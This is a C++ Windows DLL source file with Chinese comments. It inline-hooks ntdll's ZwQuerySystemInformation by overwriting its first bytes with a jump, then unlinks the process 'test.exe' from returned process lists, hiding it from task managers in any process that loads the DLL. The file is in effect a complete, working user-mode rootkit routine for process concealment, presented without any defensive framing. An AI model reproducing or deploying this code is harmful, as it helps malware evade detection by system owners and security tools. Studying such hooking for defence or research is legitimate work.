// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <ntstatus.h>
#include <winternl.h> 
#pragma comment(lib, "ntdll.lib")

BYTE g_pOrgBytes[12] = { 0 };

typedef NTSTATUS(WINAPI* NTQUERYSYSTEMINFORMATION)(
    IN      SYSTEM_INFORMATION_CLASS SystemInformationClass,
    IN OUT  PVOID                    SystemInformation,
    IN      ULONG                    SystemInformationLength,
    OUT     PULONG                   ReturnLength
    );

BOOL Hook(LPCSTR szDllName, LPCSTR szFunName, PROC pfnNew, PBYTE pOrgBytes)
{
    DWORD dwOldProtect;
    HMODULE hModule = GetModuleHandleA(szDllName);
    PROC pfnOrg = GetProcAddress(hModule, szFunName);
    BYTE pBuf[12] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0xff, 0xe0 };

    //修改区域权限
    VirtualProtect((LPVOID)pfnOrg, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    //保存原有的12字节数据
    memcpy(pOrgBytes, pfnOrg, 12);
    //将HOOK函数的地址填进缓冲区
    //将目标地址拷贝到指令中
    memcpy(&pBuf[2], &pfnNew, 8);
    //篡改待钩取函数
    memcpy(pfnOrg, pBuf, 12);
    //恢复权限
    VirtualProtect((LPVOID)pfnOrg, 12, dwOldProtect, &dwOldProtect);
    return TRUE;
}

BOOL UnHook(LPCSTR szDllName, LPCSTR szFunName, PBYTE pOrgBytes)
{
    DWORD dwOldProtect;
    HMODULE hModule = GetModuleHandleA(szDllName);
    PROC    pfnOrg = GetProcAddress(hModule, szFunName);

    VirtualProtect(pfnOrg, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);
    memcpy(pfnOrg, pOrgBytes, 12);
    VirtualProtect(pfnOrg, 12, dwOldProtect, &dwOldProtect);
    return TRUE;
}

NTSTATUS MyZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    UnHook("ntdll.dll", "ZwQuerySystemInformation", g_pOrgBytes);
    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    PROC    pfnOld = GetProcAddress(hModule, "ZwQuerySystemInformation");
    NTSTATUS status = ((NTQUERYSYSTEMINFORMATION)pfnOld)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev = NULL;

    if (status != STATUS_SUCCESS)
        goto __END;

    if (SystemInformationClass == SystemProcessInformation)
    {
        pCur = (PSYSTEM_PROCESS_INFORMATION)(SystemInformation);
        while (true)
        {
            if (!lstrcmpi(pCur->ImageName.Buffer, L"test.exe"))
            {
                //需要隐藏的进程是最后一个节点
                if (pCur->NextEntryOffset == 0)
                    pPrev->NextEntryOffset = 0;
                //不是最后一个节点，则将该节点取出
                else
                    pPrev->NextEntryOffset += pCur->NextEntryOffset;

            }
            //不是需要隐藏的节点，则继续遍历
            else
                pPrev = pCur;
            //链表遍历完毕
            if (pCur->NextEntryOffset == 0)
                break;
            pCur = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCur + pCur->NextEntryOffset);
        }
    }
__END:
    Hook("ntdll.dll", "ZwQuerySystemInformation", (PROC)MyZwQuerySystemInformation, g_pOrgBytes);
    return status;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Hook("ntdll.dll", "ZwQuerySystemInformation", (PROC)MyZwQuerySystemInformation, g_pOrgBytes);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        UnHook("ntdll.dll", "ZwQuerySystemInformation", g_pOrgBytes);
        break;
    }
    return TRUE;
}

